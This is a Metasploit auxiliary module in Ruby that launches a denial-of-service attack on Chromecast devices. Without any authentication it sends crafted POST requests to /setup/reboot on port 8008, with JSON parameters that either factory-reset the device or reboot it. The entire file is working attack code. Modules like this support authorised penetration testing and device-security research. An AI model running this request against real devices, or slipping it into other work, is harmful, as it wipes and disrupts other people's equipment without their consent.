##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Chromecast Factory Reset DoS',
      'Description' => %q{
        This module performs a factory reset on a Chromecast, causing a denial of service (DoS).
        No user authentication is required.
      },
      'Author' => ['wvu'],
      'References' => [
        ['URL', 'http://www.google.com/intl/en/chrome/devices/chromecast/index.html'] # vendor website
      ],
      'License' => MSF_LICENSE,
      'Actions' => [
        ['Reset', 'Description' => 'Factory reset'],
        ['Reboot', 'Description' => 'Reboot only']
      ],
      'DefaultAction' => 'Reset'
    ))

    register_options([
      Opt::RPORT(8008)
    ])
  end

  def run
    case action.name
    when 'Reset'
      res = reset
    when 'Reboot'
      res = reboot
    end

    if res && res.code == 200
      print_good("#{action.name} performed")
    elsif res
      print_error("An error occurred: #{res.code} #{res.message}")
    end
  end

  def reset
    begin
      send_request_raw(
        'method' => 'POST',
        'uri' => '/setup/reboot',
        'agent' => Rex::Text.rand_text_english(rand(42) + 1),
        'ctype' => 'application/json',
        'data' => '{"params": "fdr"}'
      )
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, e)
    ensure
      disconnect
    end
  end

  def reboot
    begin
      send_request_raw(
        'method' => 'POST',
        'uri' => '/setup/reboot',
        'agent' => Rex::Text.rand_text_english(rand(42) + 1),
        'ctype' => 'application/json',
        'data' => '{"params": "now"}'
      )
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, e)
    ensure
      disconnect
    end
  end
end
